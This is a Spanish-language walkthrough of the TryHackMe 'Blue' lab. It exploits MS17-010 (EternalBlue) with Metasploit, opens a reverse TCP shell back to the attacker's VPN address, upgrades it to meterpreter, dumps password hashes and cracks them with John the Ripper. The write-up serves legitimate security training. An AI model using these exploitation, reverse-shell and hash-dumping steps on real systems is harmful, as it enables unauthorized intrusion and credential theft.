# Blue

En este documento expondremos el recorrido realizado por la máquina Blue de TryHackMe, así como las soluciones propuestas.

Escaneamos la máquina objetivo haciendo uso de nmap. Más concretamente, emplearemos el comando **nmap -sV -sC --script vuln IP.** Gracias a este, averiguaremos los puertos abiertos, los servicios en ejecución en dichos puertos, y sus versiones correspondientes. Además, obtendremos el nombre del host, que es **JON-PC**, y la vulnerabilidad que podremos emplear contra la máquina para acceder a la misma, siendo la CVE-2017-0143, que permite la ejecución remota de código en servidores con Microsoft SMBv1 (**ms17-010**). Esto lo vamos a dividir primero buscaremos los puertos abiertos y l nombre del host y luego realizaremos el comando de las vulnerabilidades

![cbb9d40bf4d10ce2c5fa7362c448063a.png](../_resources/cbb9d40bf4d10ce2c5fa7362c448063a.png)

![8cefa11e42b227782b9dc2a2d332adce.png](../_resources/8cefa11e42b227782b9dc2a2d332adce.png)

## Gain Access

Iniciamos Metasploit con el comando sudo msfconsole, y una vez dentro, buscamos la forma de explotar la vulnerabilidad ms17-010. Para ello, empleamos el término search, seguido de la susodicha vulnerabilidad.

![8cc5d1d60e2284fb1b1b62807715ce82.png](../_resources/8cc5d1d60e2284fb1b1b62807715ce82.png)

Comandos que vamos a utilizar:

use 0 o la ruta en concreto (use exploit/windows/smb/ms17_010_eternalblue)  
show options  
set rhosts (IP THM)  
set lhost (IP de nuestra VPN)  
set payload windows/x64/shell/reverse_tcp  
run

Vemos que la primera opción (*eternalblue*), es perfecta para tratar de acceder a la máquina, por lo que la seleccionamos, y mostramos las opciones del exploit.

![3d53a897c4a0b17734a72c45df6b2e0e.png](../_resources/3d53a897c4a0b17734a72c45df6b2e0e.png)

Cambiamos la opción RHOSTS a la IP de la máquina a vulnerar. Después de esto, podremos ejecutar el exploit, haciendp uso del comando run o exploit.

![7d039fb6d54f2873b36327a48eaa1a23.png](../_resources/7d039fb6d54f2873b36327a48eaa1a23.png)

Y ahora usamos el comando run:  
Al finalizar nos tienen que mostrar la siguiente salida:

![6ce5f9870797c59fa2ce69b9c1327927.png](../_resources/6ce5f9870797c59fa2ce69b9c1327927.png)

Una vez que vemos que ha funcionado, oprimimos CTRL+Z para dejar la sesión iniciada en segundo plano (background). y pulsamos y para guardar la session

![08e154bdffbccd82b28b239d1c96a43e.png](../_resources/08e154bdffbccd82b28b239d1c96a43e.png)

## Escalate

Convertimos nuestra shell en meterpreter, y para ello buscamos en Metasploit \*shell_to_meterpreter. Una vez que nos muestre los resultado, elegimos la primera (use 0).

![67f4932883c1138e6adac74880ab6a52.png](../_resources/67f4932883c1138e6adac74880ab6a52.png)

Una vez realizado el comando lo seleccionaremos con el comando use (numero identificativo) y luego utilizaremos el comando show options para ver que modulos son requeridos.

![e3be3bc72ce52831a4951dd9776a6442.png](../_resources/e3be3bc72ce52831a4951dd9776a6442.png)

También debemos cambiar la opcion LHOST a nuestra IP VPN

![95b8b92acc2d60bab55acdc6bdec24a9.png](../_resources/95b8b92acc2d60bab55acdc6bdec24a9.png)

Podemos mostrar todas las sesiones activas con el comando sessions -l

![589e46bbea04472f20f48ae822201e5b.png](../_resources/589e46bbea04472f20f48ae822201e5b.png)

![95b5fa9a4a98511be0d792f012579e96.png](../_resources/95b5fa9a4a98511be0d792f012579e96.png)

&nbsp;

Una vez convertida la sesión hay que seleccionarla para poder utilizar la línea de comandos:  
![2d989baca99940c22c447ab51d695f23.png](../_resources/2d989baca99940c22c447ab51d695f23.png)

Seleccionamos la sesión en la que se encuentra el meterpreter

![7308ea6b3fb489e59dca0789cd817565.png](../_resources/7308ea6b3fb489e59dca0789cd817565.png)

Si ejecutamos el comando shell seguido de whoami, la consola nos muestra NT authority\\system, lo que indica que hemos accedido y escalado privilegios de forma exitosa en el sistema.

![69b5f204b1841778cb199aa4a465d8b2.png](../_resources/69b5f204b1841778cb199aa4a465d8b2.png)

Ahora listaremos todos los procesos del sistema con el comando ps, para migrar a un proceso corriendo bajo el usuario NT authority\\system. Este proceso se podría encontrar en el fondo de la lista (en nuestro caso es el proceso conhost.exe)

![60b6031ee256b2050cd914e50a64fd76.png](../_resources/60b6031ee256b2050cd914e50a64fd76.png)

Cracking

Comenzaremos ejecutando el comando hashdump, que mostrará los hashes de las contraseñas de los diferentes usuarios del sistema, entre ellos el usuario JON-PC, que es el que nos interesa.

![adfd7a2067986897ebca76ef23834e8f.png](../_resources/adfd7a2067986897ebca76ef23834e8f.png)

Luego, anotaremos el hash de la contraseña del usuario antes mencionado en un archivo llamado hash.txt, de modo que usando el software johntheripper, podamos crackear el hash.

Una vez obtenido el hash de la contraseña, se debe copiar en un txt y descifrar la contraseña verdadera con la herramienta John de la siguiente manera:

![cfd40eada3c63b7712641f68aad8f218.png](../_resources/cfd40eada3c63b7712641f68aad8f218.png)

## Flags

La primera flag la encontramos en el directorio C:\\, la cual tras usar un cat en el archivo que vemos en la siguiente imagen nos mostrará la solución.

![8bfbe96af4e2017be81de4a9a95c8b5b.png](../_resources/8bfbe96af4e2017be81de4a9a95c8b5b.png)

Para encontrar la segunda flag emplearemos el comando search -f flag2.txt, lo que nos arrojará como resultado la ubicación de la misma

![60479f2abf960fe11fac9497df37d34b.png](../_resources/60479f2abf960fe11fac9497df37d34b.png)

Y haremos lo mismo que hicimos con la primera flag utilizando el comando cat para visualizarlo:

![2feb6d55a40acad83c258be5041c2d09.png](../_resources/2feb6d55a40acad83c258be5041c2d09.png)

La tercera y última flag la encontramos en el directorio Documents del usuario JON-PC, por lo que accedemos a dicha carpeta y usamos cat de nuevo.

![fc594e6176afdbd0f1cdd300dff47a63.png](../_resources/fc594e6176afdbd0f1cdd300dff47a63.png)

&nbsp;

&nbsp;